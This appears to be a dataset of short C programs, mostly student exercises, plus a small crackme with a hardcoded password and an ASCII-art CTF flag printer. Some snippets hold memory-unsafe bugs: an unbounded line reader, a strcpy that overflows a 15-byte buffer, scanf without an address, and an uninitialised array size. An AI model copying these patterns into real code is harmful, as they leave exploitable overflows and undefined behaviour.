    "#include <stdio.h>\nvoid readLine (char buffer[]);\nint main(int argc, char const *argv[])\n{\n    int i;\n    char line[81];\n    for( i = 0; i < 51; i++)\n    {\n        readLine (line);\n        printf (\"%s\\n\\n\", line);\n    }\n    return 0;\n}\nvoid readLine (char buffer[])\n{\n    char character;\n    int i = 0;\n    printf(\"Enter a line of text, up to 80 characters. Hit enter when done:\\n\");\n    do\n    {\n        character = getchar();\n        buffer[i] = character;\n        i++;\n    } while (character != '\\n');\n    buffer[i -1] = '\\0';\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <limits.h>\n\n\nchar template[30];\nint pairs_size;\nchar** pairs;\nlong* pair_count;\nint find_pair(char a, char b) {\n for (int i = 0; i < pairs_size; i++) {\n  if (pairs[i][0] == a && pairs[i][1] == b) {\n   return i;\n  }\n }\n return -1;\n}\nvoid inc_pair(char a, char b) {\n for (int i = 0; i < pairs_size; i++) {\n  if (pairs[i][0] == a && pairs[i][1] == b) {\n   pair_count[i]++;\n   return;\n  }\n }\n}\nint main(int ac, char** args) {\n    int input = ac > 1;\n FILE *fp = fopen(input ? \"d14_input\" : \"d14_short_input\", \"r\");\n if (fp == ((void*)0)) {\n  printf(\"cant read file\\n\");\n        return 1;\n }\n fscanf(fp, \"%s\", template);\n fgetc(fp);\n fgetc(fp);\n int init_size = strlen(template);\n char c;\n while ((c = fgetc(fp)) != (-1)) {\n  if (c == '\\n') pairs_size++;\n }\n rewind(fp);\n pairs = (char**) malloc(pairs_size * sizeof(char*));\n for (int i = 0; i < pairs_size; i++) {\n  pairs[i] = malloc(3 * sizeof(char));\n }\n char line[30];\n fscanf(fp, \"%s\\n\", line);\n int pair_index = 0;\n while (fscanf(fp, \"%c%c -> %c\\n\",\n    &pairs[pair_index][0],\n    &pairs[pair_index][1],\n    &pairs[pair_index][2]) > 0) {\n  pair_index++;\n }\n pair_count = (long*) calloc(pairs_size, sizeof(long));\n int template_size = strlen(template);\n for (int i = 0; i < template_size - 1; i++) {\n  inc_pair(template[i], template[i + 1]);\n }\n int steps = 10;\n for (int s = 1; s <= steps; s++) {\n  long* temp = calloc(pairs_size, sizeof(long));\n  for (int i = 0; i < pairs_size; i++) {\n   int count = pair_count[i];\n   char ins = pairs[i][2];\n   int pair1 = find_pair(pairs[i][0], ins);\n   int pair2 = find_pair(ins, pairs[i][1]);\n   temp[pair1] += count;\n   temp[pair2] += count;\n   if (count > 0) {\n    temp[i] -= count;\n   }\n  }\n  for (int i = 0; i < pairs_size; i++) {\n   pair_count[i] += temp[i];\n  }\n  free(temp);\n }\n long element_count[30] = {0};\n for (int i = 0; i < pairs_size; i++) {\n  element_count[pairs[i][0] - 'A'] += pair_count[i];\n }\n element_count[template[template_size - 1] - 'A']++;\n long min = 2147483647L;\n long max = (-2147483647L -1L);\n for (int i = 0; i < 30; i++) {\n  if (element_count[i] < min && element_count[i] > 0) {\n   min = element_count[i];\n  }\n  if (element_count[i] > max) {\n   max = element_count[i];\n  }\n }\n printf(\"resault = %li\\n\", (max - min));\n return 0;\n}",
    "void swap(int *a, int *b) {\n    int aux = *a;\n    *a = *b;\n    *b = aux;\n}\n\nstatic int array[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\nint main() {\n    int i = 0;\n    while(1){\n        swap(&array[i], &array[i+1]);\n        i = (i + 1) % (10 - 1);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nint main(int argc, const char *const argv[]) {\n  if (argc < 2) {\n    fprintf((stderr), \"I want a password as argument.\\n\");\n    return 1;\n  }\n  ++argv;\n  if (strcmp(*argv, \"quoi_de_neuf_docteur\") == 0) {\n    printf(\"C'est bingo !\\n\");\n    return 0;\n  }\n  printf(\"Non, c'est pas bon...\\n\");\n  return 1;\n}",
    "int main(void) {\n  return 1;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n    int r,c;\n    printf(\"enter no.of rows and column \");\n    scanf(\"%d %d\",&r,&c);\n    int* arr[r];\n    for(int i=0;i<r;i++)\n    {\n        arr[i]=(int*)malloc(c*sizeof(int));\n    }\n    for(int i=0;i<r;i++)\n    {\n        for(int j=0;j<c;j++)\n        {\n            scanf(\"%d\",&arr[i][j]);\n        }\n    }\n        for(int i=0;i<r;i++)\n    {\n        for(int j=0;j<c;j++)\n        {\n           printf(\"%d \",arr[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    int temp;\n    for(int i=0;i<r;i++)\n    {\n        for(int j=0;j<c/2;j++)\n        {\n            temp=arr[i][j];\n            arr[i][j]=arr[i][c-1-j];\n            arr[i][c-1-j]=temp;\n        }\n    }\n    printf(\"The swapped matrix : \\n\");\n    for(int i=0;i<r;i++)\n    {\n        for(int j=0;j<c;j++)\n        {\n           printf(\"%d \",arr[i][j]);\n        }\n        printf(\"\\n\");\n    }\n}",
    "#include<stdio.h>\nint main()\n{\nint i,j,n,vetor[10] = {0,0,0,0,0,0,0,0,0,0};\nfloat aux;\nscanf(\"%d\\n\",&n);\nfor(i=0;i<n;i++)\n{\n scanf(\"%f\",&aux);\n for(j=0;j<10;j++)\n {\n  if(j==0)\n  {\n   if((j<=aux)&&(aux<=(j+1)))\n   {\n   vetor[j]++;\n   j = 10;\n   }\n  }else{\n   if((j<aux)&&(aux<=(j+1)))\n   {\n   vetor[j]++;\n   j = 10;\n   }\n  }\n }\n}\nprintf(\"^\\n\");\nfor(j=9;j>=0;j--)\n{\n printf(\"|\");\n while(vetor[j]>0)\n {\n printf(\"*\");\n vetor[j]--;\n }\n printf(\"\\n\");\n}\nprintf(\"+------------>\\n\");\nreturn 0;\n}",
    "#include<stdio.h>\nint main(){\n  int numero, factorial=1, x;\n  printf(\"Ingrese un numero positivo entero para calcular su factorial: \");\n  scanf(\"\\n%ld\", &numero);\n  for(x=1;x<=numero;x++){\n    factorial= factorial*x;\n  }\n  printf(\"El factorial del numero ingresado es: %ld\", factorial);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n {\n   char s[] = \"TajMahal\";\n   int i = 0;\n   int vowels = 0;\n   int consonants = 0;\n   while(s[i++] != '\\0') {\n      if(s[i] == 'a' || s[i] == 'e' || s[i] == 'i' || s[i] == 'o' || s[i] == 'u' )\n         vowels++;\n      else\n         consonants++;\n   }\n   printf(\"'%s' contains %d vowels and %d consonants.\", s, vowels, consonants);\n   return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int val;\n    scanf(\"%d\", val);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n int a=250;\n char b='F';\n float c=3.14;\n double d=3.141592653;\n printf(\"%d\\n\",a );\n printf(\"%c\\n\", b);\n printf(\"%.2f\\n\",c );\n printf(\"%11.9f\\n\", d);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nint n,j,temp,temp1,temp2,pr[10],b[10],t[10],w[10],p[10],i;\nfloat att=0,awt=0;\nfor(i=0;i<10;i++)\n            {\n                        b[i]=0;w[i]=0;\n            }\nprintf(\".::SJF::.\");\nprintf(\"\\n\\nEnter the number of processes :\");\nscanf(\"%d\",&n);\nprintf(\"Enter the burst times :\");\nfor(i=0;i<n;i++)\n            {\n                        scanf(\"%d\",&b[i]);\n                        p[i]=i;\n            }\nfor(i=0;i<n;i++)\n            {\n                        for(j=i;j<n;j++)\n                        {\n                                    if(b[i]>b[j])\n                                    {\n                                                temp=b[i];\n                                                temp1=p[i];\n                                                b[i]=b[j];\n                                                p[i]=p[j];\n                                                b[j]=temp;\n                                                p[j]=temp1;\n                                                }\n}\n}\nw[0]=0;\nfor(i=0;i<n;i++)\nw[i+1]=w[i]+b[i];\nfor(i=0;i<n;i++)\n        {\nt[i]=w[i]+b[i];\n            awt=awt+w[i];\n            att=att+t[i];\n        }\nawt=awt/n;\natt=att/n;\nprintf(\"\\nProcess \\t Waiting time \\t Turn around time \\n\");\nfor(i=0;i<n;i++)\nprintf(\"p[%d] \\t\\t %d \\t\\t %d \\n\",p[i],w[i],t[i]);\nprintf(\"\\nThe average waiting time is %f\\n\",awt);\nprintf(\"The average turn around time is %f\\n\",att);\nreturn 1;\n}",
    "#include <stdio.h>\nint main(){\n int n=10;\n int a=5;\n int i;\n if (n>0)\n  for (i=0;i<n;i++)\n   if (a>i)\n    printf(\"a=%d, i=%d, and a>i\\n\",a,i);\n   else\n    printf(\"error:n<0\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nlong hash(char *);\nint main()\n{\n char word[200];\n printf(\"%ld\",hash(word));\n return 0;\n}\nlong hash(char *word)\n{\n long i=42,l;\n scanf(\"%s\",word);\n l = strlen(word);\n for(;l>=0;l--)\n {\n  i=i+word[l]*(l+1);\n }\n return i;\n}",
    "#include <stdio.h>\nint arraySum(int array[], const int n)\n{\n    int sum = 0, *ptr;\n    int * const arrayEnd = array + n;\n    for (ptr = array; ptr < arrayEnd; ++ptr)\n        sum += *ptr;\n    return sum;\n}\nint main(void)\n{\n    int arraySum(int array[], const int n);\n    int values[10] = {3, 7, -9, 3, 6, -1, 7, 9, 1, -5};\n    printf(\"The sum is %i\\n\", arraySum(values, 10));\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n  int x;\n  long long int y;\n  for (x=1; x<=100; x++)\n    printf(\"%d \",x);\n  printf(\"\\n1-100 printed\\n\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n\n\npthread_mutex_t mutex = {{{0}}};\nint *bancoDeDados = ((void*)0), flag = 1, size = 0;\nvoid *escrever(void *arg){\n    int threadID = *((int*)arg), i = 0;\n    while(1){\n        pthread_mutex_lock(&mutex);\n        printf(\"A Thread escritora de ID [%d] est\u00e1 escrevendo no Banco de Dados\\n\", threadID);\n        flag = 1;\n        if(i <= (-1e5)){\n            i = 0;\n        }else{\n            i--;\n        }\n        bancoDeDados = (int*) realloc(bancoDeDados, sizeof(int)*(size+1));\n        bancoDeDados[size] = i;\n        size++;\n        flag = 0;\n        pthread_mutex_unlock(&mutex);\n    }\n}\nvoid *ler(void *arg){\n    int threadID = *((int*)arg), pos;\n    while(1){\n        if(flag == 0){\n            pos = rand()%(size+1);\n            printf(\"A Thread leitora de ID [%d] leu a posi\u00e7\u00e3o [%d] do Banco de Dados: %d\\n\", threadID, pos, bancoDeDados[pos]);\n        }\n    }\n}\nint main(){\n    pthread_t escritoras[8];\n    pthread_t leitoras[4];\n    int *idsE[8], *idsL[4];\n    for(int i = 0; i < 8; i++){\n        idsE[i] = (int*) malloc(sizeof(int));\n        *idsE[i] = i;\n        if(pthread_create(&escritoras[i], ((void*)0), &escrever, (void*)idsE[i]) != 0){\n            perror(\"Failed to create thread\");\n        }\n    }\n    for(int i = 0; i < 4; i++){\n        idsL[i] = (int*) malloc(sizeof(int));\n        *idsL[i] = i;\n        if(pthread_create(&leitoras[i], ((void*)0), &ler, (void*)idsL[i]) != 0){\n            perror(\"Failed to create thread\");\n        }\n    }\n    pthread_exit(((void*)0));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint say_hello(int n_times)\n{\n    for (int cont = 0; cont < n_times; cont++)\n    {\n        printf(\" - Hello! \\n\");\n    }\n    return 0;\n}\nint main()\n{\n    int n = 0;\n    int (*fPointer)(int);\n    fPointer = say_hello;\n    printf(\" - How many times? \");\n    scanf(\"%d\", &n);\n    fPointer(n);\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <stdbool.h>\n#include <string.h>\n\n_Bool recursivo(char* s, int i);\n_Bool isPalindromo(char* s);\n_Bool ehFim(char* str);\nint main(){\n    char str[750][750];\n    int tam=0;\n    do{\n        fgets(str[tam], 750, (stdin));\n        str[tam][strlen(str[tam]) - 1] = '\\0';\n    }while(ehFim(str[tam++])==0);\n    tam--;\n    for(int i=0;i<tam;i++){\n        if(isPalindromo(str[i])){\n            printf(\"SIM\\n\");\n        }\n        else{\n            printf(\"NAO\\n\");\n        }\n    }\n}\n_Bool ehFim(char* str){\n    _Bool resp=0;\n    if(str[0]=='F' && str[1]=='I' && str[2]=='M') resp=1;\n    return resp;\n}\n_Bool isPalindromo(char* s){\n    return recursivo(s, 0);\n}\n_Bool recursivo(char* s, int i){\n    _Bool resp=0;\n    int k=strlen(s)-i-1;\n    int j=1+i;\n    if(i==strlen(s)/2){\n        resp=1;\n    }\n    else if(s[i]==s[k] && recursivo(s, j)){\n        resp=1;\n    }\n    return resp;\n}",
    "#include <stdio.h>\nint main(){\n int n;\n scanf(\"%d\",&n);\n switch(n){\n  case 1: printf(\"ONE\"); break;\n  case 2: printf(\"TWO\"); break;\n  case 3: printf(\"THREE\"); break;\n  default: printf(\"Some other number\");\n }\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main(){\n  int matriz[2][3];\n  int i,j;\n  for (i=0;i<2;i++){\n    for (j=0;j<3;j++){\n        printf(\"Digite um valor linha %d e coluna %d da matriz\\n\",i,j);\n        scanf(\"%d\",&matriz[i][j]);\n    }\n  }\n   for (i=0;i<2;i++){\n    for (j=0;j<3;j++){\n        printf(\"O valor da linha %d e coluna %d da matriz eh %d\\n\",i,j,matriz[i][j]/2);\n    }\n  }\n  system(\"pause\");\n  return 0;\n}",
    "#include <stdio.h>\nlong int fact(int n) {\n if(n==1) return 1;\n return n*fact(n-1);\n}\nint main() {\n long int a = fact(3);\n printf(\"%ld \\n\",a);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    printf(\"Maxium of signed char %d\\n\",\n        (char)((unsigned char)~0>>1));\n    printf(\"Minium of signed char %d\\n\",\n        -(char)((unsigned char)~0>>1));\n    printf(\"Maxium of unsigned char %d\\n\",\n        (unsigned char)~0);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int a[5];\n int i;\n printf(\"enter five integer number \\n\");\n for(i=0;i<5;i++)\n scanf(\"%d\",&a[i]);\n printf(\"array elements are :\\n\");\n for(i=4;i>=0;i--)\n printf(\"%d\\n\",a[i]);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int x;\n  printf(\"%p\\n\", &x);\n  return 0;\n}",
    "#include <stdio.h>\nint main() {\n    float A, M;\n    printf(\"Entre com um valor de area em acres \");\n    scanf(\"%f\", &A);\n    M = A * 4048.58;\n    printf(\"O valor da area em metros quadrados e %f\\n\", M);\n    return 0;\n}",
    "#include <assert.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint c_atoi(const char *str)\n{\n    int i;\n    int sign;\n    long value;\n    long prev;\n    i = 0;\n    sign = 1;\n    value = 0;\n    while (((str[i] <= 13 && str[i] >= 9) || str[i] == 32) && str[i] != '\\0')\n        i++;\n    if (str[i] == '-')\n\t{\n        sign = -1;\n\ti++;\n\t}\n    else if (str[i] == '+')\n\t{\n        sign = 1;\n\ti++;\n\t}\n    while (str[i] >= 48 && str[i] <= 57 && str[i] != '\\0')\n    {\n        prev = value;\n        value = value * 10 + sign * (str[i] - '0');\n        if (sign == 1 && prev > value)\n            return (-1);\n        else if (sign == -1 && prev < value)\n            return (0);\n        i++;\n    }\n    return (value);\n}\nvoid test_c_atoi()\n{\n    printf(\"<<<< TEST FUNCTION >>>>\\n\");\n    assert(c_atoi(\"123\") == atoi(\"123\"));\n    assert(c_atoi(\"-123\") == atoi(\"-123\"));\n    assert(c_atoi(\"\") == atoi(\"\"));\n    assert(c_atoi(\"-h23\") == atoi(\"-h23\"));\n    assert(c_atoi(\"         23\") == atoi(\"         23\"));\n    assert(c_atoi(\"999999999\") == atoi(\"999999999\"));\n    printf(\"<<<< TEST DONE >>>>\\n\");\n}\nint main(int argc, char **argv)\n{\n    test_c_atoi();\n    if (argc == 2)\n    {\n        printf(\"Your number + 5 is %d\\n\", c_atoi(argv[1]) + 5);\n        return (0);\n    }\n    printf(\"wrong number of parmeters\\n\");\n    return (1);\n}",
    "#include <stdio.h>\nint main(void)\n{\n int start = 4, count = 1;\n char testStr[] = \"1234.1234\";\n void removeString(char str[], int start, int count);\n printf(\"Before removed: %s\\n\", testStr);\n removeString(testStr, start, count);\n printf(\"After %i elements removed from index %i: %s\\n\", count, start, testStr);\n return 0;\n}\nvoid removeString(char str[], int start, int count)\n{\n int i = start, length;\n int stringLength(char string[]);\n length = stringLength(str);\n if(start + count <= length)\n  while(str[i + count] != '\\0'){\n   str[i] = str[i + count];\n   ++i;\n  }\n str[i] = '\\0';\n}\nint stringLength(char string[])\n{\n int count = 0;\n while(string[count] != '\\0')\n  ++count;\n return count;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nint main(void) {\n    int i, quantidade;\n    printf (\"Quantidade de pol\u00edgonos: \");\n    scanf (\"%d\", &quantidade);\n    float resultado [quantidade];\n    int lados [quantidade];\n    float valorlado [quantidade];\n    for (i = 0; i < quantidade; i++) {\n        printf (\"Pol\u00edgono %d\\n\", i + 1);\n        printf (\"Quantidade de lados: \");\n        scanf (\"%d\", &lados [i]);\n        printf (\"Valor do lado: \");\n        scanf (\"%f\", &valorlado [i]);\n        resultado [i] = lados [i] * valorlado [i];\n    }\n    printf (\"Per\u00edmetros:\\n\");\n    for (i = 0; i < quantidade; i++) {\n        printf (\"Pol\u00edgono %d -> %.2f\\n\", i + 1, resultado [i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\n\n\n\n\n\n\nvoid stars(){\n printf(\"\\x1b[34m\" \"***********************************************\" \"\\x1b[0m\" \"\\n\");\n}\nint main() {\n stars();\n printf(\"\\x1b[32m\"\";::::,,,::,,;';:,,:,....`.,.,..:';:,.,,:...,,,,\\n\");\n printf(\":,:::,:;':,::,....:,..,,.,,.,,:::,,,..,:,......\\n\");\n printf(\":,::,,;++:,.,,.,,,:,``.,,,:,,,:,,,,,,..,,.```..\\n\");\n printf(\":,,::;+#',..,,,,,.,.```,,:::::;:,:,:,,,,,.````.\\n\");\n printf(\",:;::'++;:,..:,,.`..``.,::;;:::::::::::,,..```.\\n\");\n printf(\";:;;'''':::,,,,...,..,:;,;:;:::::::;;::,,..``..\\n\");\n printf(\"';'';;';:::::,,,,:..,:::::;;;;::::::;;:::..```.\\n\");\n printf(\"';;;;'''';;::::::,.,;;;'';';;;;':;;+'';;;,````.\\n\");\n printf(\":::;'':::;:::::,`..::''';'::::;+;';;':;'::``...\\n\");\n printf(\":;::;,..:;;;::,`.,:::.:,,,:::,,:,:,::'';;:,`...\\n\");\n printf(\";::,,...:;;;:,..::.,,.,:::;:,::,:;,;:;;;,.:``..\\n\");\n printf(\";.,:,,.,:::;;..,,,,,.:::;;::::::,,::,;;:':.. `.\\n\");\n printf(\":..::,,:;;''..,,,,:::;:';''''':;',..:;:'';,. `.\\n\");\n printf(\"::,:::,:;''...:.,:;;:;+'++''+'+''+:;:,`:';,.. .\\n\");\n printf(\":::::::;'':`,:,:;;:';''+++++++'''+':;;;,:;;;` `\\n\");\n printf(\"';;:;;;;';``,,::;:;;''+'+##+#+++';';;::;:'':,` \\n\");\n printf(\";;;;;;;;:, .,:::::;:';'+#++#+##+';';::,:;;+;;` \\n\");\n printf(\";;::::::,..,::;:::;:;;:;::,;::;;'''''''.::;:;,`\\n\");\n printf(\";;:,:::::`.,::,:,,.....,,..,.,,::';;;;;:,;;:,,.\\n\");\n printf(\":,,,:,,::`.:::,,,,..,::,,......,.,,,:;;::,;;:;.\\n\");\n printf(\":,,::..:,`,,,:::::::,:::::::,:::,....:,;;:;;;.,\\n\");\n printf(\",,,,::,::`:,,::;'+#+'::;;;:;;;;::,,::,,;;;:;;;.\\n\");\n printf(\"::,,::::..::;:''+#@###+'+++++''++++';:;;:;;;:#.\\n\");\n printf(\"::,::::,`,;:;;;+#@@@@@@@######@@####+;:;;;;;:+;\\n\");\n printf(\"/*;:::,::,.:::;'+####@#@@@@##@@@@@@@@##';';;+;,\\n\");\n printf(\":::,,,,,,:::;++++'+'@@#######@#@;@@@#+'';';';';\\n\");\n printf(\",,,,,,...;:;:'''::;'''+':'+##++#@@+##+'+'''':;:\\n\");\n printf(\",,,,,:,,,::';';':,;'';;,:;:;;;;'+';''''+''''';;\\n\");\n printf(\":::,,,:,,:'':''';;'::,;:,::;,;;:;;::;';':';';;'\\n\");\n printf(\":::::,,,:;'';:;;''':::,:,,:::;;;;::,;'''';';;;'\\n\");\n printf(\"::;::,,,:;+';;';;++'::,,:,:::;:;;;';;';''''':;'\\n\");\n printf(\",:;:,,..:;';';:''+;+;:::;;::::::'';';;;'''+':''\\n\");\n printf(\"...,:.``,;;;;:;;':'+::,,':;;'::'+';;:;;''+#;::'\\n\");\n printf(\"..,,....,:';:;:;:''',,,,,',:;';+'++';;;'+++;:';\\n\");\n printf(\".:,,.,.`,:'';;;:';';,++:.,,,::'++'';:;'+++'':;'\\n\");\n printf(\",::,.,..,;'';;;;';';:+@@,.'#@:;'''';;:;''';;.;;\\n\");\n printf(\",;:,,...,';'';;::'':,'#@@+@@+,:;'';;;:;''+'',::\\n\");\n printf(\",,::,,,,,''';;;;'',;,:'#+###'::;'';;;;'+'';;,;;\\n\");\n printf(\"::::,::::'''+:;'',,':,,:,:;:,,';';':;;';'+':;;:\\n\");\n printf(\":;;:;:.::+;'';;;;,,;:,,..,,,,;;:;;;;'';'+'+:::;\\n\");\n printf(\":;;:::,,:;+';'';.,:;;:,,,.,:;;;:;'''+'''++',';;\\n\");\n printf(\";;:::,:::;''+';'::;;;;::::;;;;;;:''++'++''':'';\\n\");\n printf(\";;;::,::,:':'';;;;';';;:::;;'''';'';'+''''';';;\\n\");\n printf(\";;;::;:;;:;;;''';;;;;;:;;;:;;;;'';+'++';'''':;'\\n\");\n printf(\";;;':;;:;;;:;''+;###;,` `;##';''''+'+;;''+'';;;\\n\");\n printf(\";;';:;;;;;;;:''++'''';;:,...:#@#+'+'+'''''+';;;\\n\");\n printf(\"';';;;;;;';;;';+'+####@@###'';;'++++''''+++';::\\n\");\n printf(\"''''''''''''';;+++#####@@@@####+++'+'+'+++';;;;\\n\");\n printf(\"'+;'''''++';;;;++'##+######@##++'+'';'++#';';:;\\n\");\n printf(\"''+'+'+++'';::;'+#++####+#####++++;+'+#++;';;;;\\n\");\n printf(\"+'+''++'+;;::,:;+###########+###++'+###++;;;:;;\\n\");\n printf(\"+''''+'+';:::,:::################'#####+'':;;;'\\n\");\n printf(\"'''+++'';:::::::,'#@#######@##########+';'';;';\\n\");\n printf(\"'''+''';:::::::::,+#@@@@##@@@######@@+''';'';';\\n\");\n printf(\"''''';;:,,::::::,:;'#@@@@@@@#####@#@@'';'''';;;\\n\");\n printf(\"'+';:;::::::;:::,:;++###@#@####@#####'';'''';;;\\n\");\n printf(\"'';;;:;;;:::::;:,;;++#+#+#####@######'';''';;''\\n\"\"\\x1b[0m\");\n printf(\"\\x1b[33m\" \"***************FLAG:HIDETOSURVIVE**************\" \"\\x1b[0m\" \"\\n\");\n stars();\n fflush((stdout));\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int n,b,a,rev=0;\n printf(\"Enter a Number \");\n scanf(\"%d\",&n);\n a=n;\n while(a!=0)\n {\n  b=a%10;\n  rev=(rev*10)+b;\n  a=a/10;\n }\n printf(\"The Reverse of the number %d is %d\",n,rev);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int i;\n  int n;\n  int a[n];\n  int b[n];\n#pragma scop\n  for (i = 0; i < n; ++i)\n    printf(\"%d %d\",a[i + 1],b[n]);\n#pragma endscop\n}",
    "#include <stdio.h>\nint a[100000]={0};\nint main(){\n int n,k;\n scanf(\"%d\",&n);\n for(int i=0;i<n;i++)\n {\n  int j;\n  scanf(\"%d\",&j);\n  a[j]++;\n }\n scanf(\"%d\",&k);\n int h=0;\n for(int i=100000;i>=0;i--){\n  if(a[i]!=0)\n  h++;\n  if(h==k)\n  {\n   printf(\"%d %d\",i,a[i]);\n   break;\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\nint fatorial(unsigned int i) {\n   if(i <= 1) {\n      return 1;\n   }\n   return i * fatorial(i - 1);\n}\nint main() {\n   int i = 7;\n   printf(\"fatorial de %d \u00e9 %d\\n\", i, fatorial(i));\n   return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int i;\n  for (i = 0; i < 3; i++) printf(\"loop1: %d\\n\", i);\n  for (int i = 0; i < 3; i++) printf(\"loop2: %d\\n\", i);\n  printf(\"old i = %d\\n\", i);\n  for (int i = 0, j; i < 3; i++) {\n    j = i * 2 + 1; printf(\"loop3: %d %d\\n\", i, j);\n  }\n  printf(\"old i = %d\\n\", i);\n  for (int i = 0, j = i + 4; i < 3; i++, j--) {\n    printf(\"loop4: %d %d\\n\", i, j);\n  }\n  printf(\"old i = %d\\n\", i);\n  return 0;\n}",
    "#include <pthread.h>\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\npthread_mutex_t m1 = {{{0}}};\npthread_cond_t cond = {{{0}}};\nvoid* print_text(void * p);\nint main () {\n    pthread_t thread;\n    int err = 0;\n int msg_length = 256;\n char err_msg[256] = {0};\n    pthread_mutex_lock(&m1);\n    err = pthread_create(&thread, ((void*)0), print_text, ((void*)0));\n if (err) {\n  strerror_r(err, err_msg, msg_length);\n  fprintf((stderr), \"Error in creating a child thread: %s\\n\", err_msg);\n  return -1;\n }\n    for(int i = 0; i < 10; i++){\n      pthread_cond_signal(&cond);\n      pthread_cond_wait(&cond, &m1);\n      write(1, \"Message : parent\\n\", 17);\n    }\n    pthread_mutex_unlock(&m1);\n    pthread_cond_signal(&cond);\n    pthread_join(thread, ((void*)0));\n    pthread_mutex_destroy(&m1);\n    return 0;\n}\nvoid* print_text(void * p) {\n    pthread_mutex_lock(&m1);\n    for(int i = 0; i < 10; i++){\n      pthread_cond_signal(&cond);\n      pthread_cond_wait(&cond, &m1);\n      write(1, \"Message : child\\n\", 16);\n    }\n    pthread_mutex_unlock(&m1);\n    pthread_cond_signal(&cond);\n    return ((void*)0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n srand(301570435);\n while(!feof((stdout))) {\n  printf(\"%d\\n\", rand() % 1000);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void){return 0;}",
    "#include <stdio.h>\nvoid swap(int *a,int *b){\n    int temp;\n    temp=*a;\n    *a=*b;\n    *b=temp;\n}\nvoid BubbleSort(int A[],int size){\n    int i,j,flag;\n    for (i=0; i<size-1; i++) {\n        flag=0;\n        for (j=0; j<size-1-i; j++) {\n            if (A[j]>A[j+1]) {\n                swap(&A[j],&A[j+1]);\n                flag=1;\n            }\n        }\n        if (flag==0) {\n            break;\n        }\n    }\n}\nvoid Display(int A[],int size){\n    for (int i=0; i<size; i++) {\n        printf(\"%d \",A[i]);\n    }\n    printf(\"\\n\");\n}\nint main(int argc, const char * argv[]) {\n    int A[]={8,5,7,3,2};\n    BubbleSort(A, 5);\n    Display(A, 5);\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int i, odd = 0, even = 0, numbers[10] = {1, 5, 66, 21, 25, 70, 44, 62, 28, 6};\n    for(i = 0; i < 10; i++){\n        if(numbers[i] % 2 == 0){\n            even++;\n        }else{\n            odd++;\n        }\n    }\n    printf(\"Odd: %d, Even: %d\\n\", odd, even);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int i, checker;\n char ch;\n char arr[11] = \"aeiouAEIOU\";\n checker = 0;\n printf(\"Please enter a letter.\");\n scanf(\"%c\", &ch);\n for (i=0; i<10; i++)\n {\n  if (ch==arr[i]) {\n   checker = 1;\n  }\n  if (checker==1){\n   printf(\"vowel\");\n   break;\n  }\n  else{\n   printf(\"consonant\");\n   break;\n  }\n }\n return 0;\n}",
    "int main() {\n  int i = 0, j = 0, x = 0;\n  while (i < 6) {\n    while (j < 6) {\n      ++x;\n      ++j;\n    }\n    ++i;\n  }\n  return x;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(int argc, char **argv){\n char my_name[13] = \"John Pickles\";\n char your_name[15] = \"Sergeant Major\";\n printf(\"My name is %s %s.\\n\", your_name, my_name);\n strcpy(your_name, my_name);\n printf(\"Your name is now %s.\\n\", your_name);\n strcpy(your_name, \"Sergeant Major\");\n printf(\"Your name is now %s.\\n\", your_name);\n strcpy(your_name, \"Command Sergeant Major\");\n printf(\"Your name is now %s.\\n\", your_name);\n strncpy(my_name, \"Jeremiah Bullfrog\", 13);\n printf(\"My name is now %s.\\n\", my_name);\n char force[10] = \"The force\";\n char dark[14] = \"The dark side\";\n memcpy(force, \"The light side of the force\", 10);\n printf(\"The force is now %s.\\n\", force);\n memmove(dark, \"a path to powers many consider to be unnatural\", 14);\n printf(\"The dark side is now %s.\\n\", dark);\n return 0;\n}",
    "#include <stdio.h>\n\nint main(void){\n    const double euler = 2.718281;\n    printf(\"PI = %f\\nE = %f\", 3.141592, euler);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main()\n{\n for (int i = 0; i < 5; i++) {\n  printf(\"%d \\n\",i);\n }\n return 0;\n}",
